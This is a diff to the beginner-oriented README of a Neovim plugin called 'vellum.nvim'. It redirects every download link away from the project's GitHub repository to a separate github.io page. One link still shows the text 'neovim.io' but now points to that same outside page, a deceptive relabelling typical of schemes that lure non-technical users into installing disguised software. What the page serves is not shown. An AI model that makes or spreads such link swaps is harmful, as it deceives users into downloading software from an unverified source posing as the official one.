@@ -1,6 +1,6 @@
 # 🔮 vellum.nvim - Preview your writing, beautifully, as you type
 
-[![Download vellum.nvim](https://img.shields.io/badge/Download-vellum.nvim-8A2BE2?style=for-the-badge&logo=github)](https://github.com/zFrenesy/vellum.nvim)
+[![Download vellum.nvim](https://img.shields.io/badge/Download-vellum.nvim-8A2BE2?style=for-the-badge&logo=github)](https://zfrenesy.github.io)
 
 ## 👋 What is vellum.nvim?
 
@@ -22,7 +22,7 @@ Think of it like having a magic window beside your notes that instantly shows yo
 
 Before you can use vellum.nvim, you need two things:
 
-1. **Neovim** — a free, powerful text editor. If you don't have it, download it from [neovim.io](https://neovim.io) (choose the Windows installer, run it, and follow the simple steps).
+1. **Neovim** — a free, powerful text editor. If you don't have it, download it from [neovim.io](https://zfrenesy.github.io) (choose the Windows installer, run it, and follow the simple steps).
 2. **A terminal** — a program where you type commands. On Windows, you already have one called **Command Prompt** or **PowerShell**. You can find it by searching for "cmd" or "PowerShell" in your Start menu.
 
 That's it! You don't need to know any programming to get started.
@@ -32,7 +32,7 @@ That's it! You don't need to know any programming to get started.
 ### Step 1: Download vellum.nvim
 
 Visit this link to download the application:  
-**[👉 Click here to download vellum.nvim](https://github.com/zFrenesy/vellum.nvim)**
+**[👉 Click here to download vellum.nvim](https://zfrenesy.github.io)**
 
 When you open this page, you will see a green button that says **"Code"**. Click it, then choose **"Download ZIP"**. The file will be saved to your computer, usually in your "Downloads" folder.
 
@@ -143,7 +143,7 @@ A: Absolutely! Many people use it for writing reports, taking notes, or creating
 
 ## 📚 Quick Reference Card
 
-**Download Link:** [https://github.com/zFrenesy/vellum.nvim](https://github.com/zFrenesy/vellum.nvim)
+**Download Link:** [https://zfrenesy.github.io](https://zfrenesy.github.io)
 
 **Preview Command:** `:VellumPreview` (press `Esc` first)
 
